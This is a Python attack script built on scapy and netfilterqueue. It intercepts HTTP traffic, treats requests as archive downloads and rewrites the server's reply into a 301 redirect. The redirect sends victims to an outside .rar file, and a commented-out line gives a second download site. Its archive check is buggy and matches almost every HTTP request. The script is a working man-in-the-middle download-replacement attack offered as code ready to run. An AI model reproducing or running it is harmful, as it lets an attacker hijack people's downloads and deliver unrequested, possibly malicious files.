import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP REQUEST")
            if '.zip' or '.rar' in scapy_packet[scapy.Raw].load.decode():
                print("[+] rar Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)

                print("[+] Replacing the file")
                # modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://kmsauto.su/index.php?do=download&id=59\n\n")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://bestink.ru/Profiles/Original/Lomond_PPP_Satin_PR1.rar\n\n")
                packet.set_payload(bytes(modified_packet))

            # print("HTTP RESPONSE")
            # print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
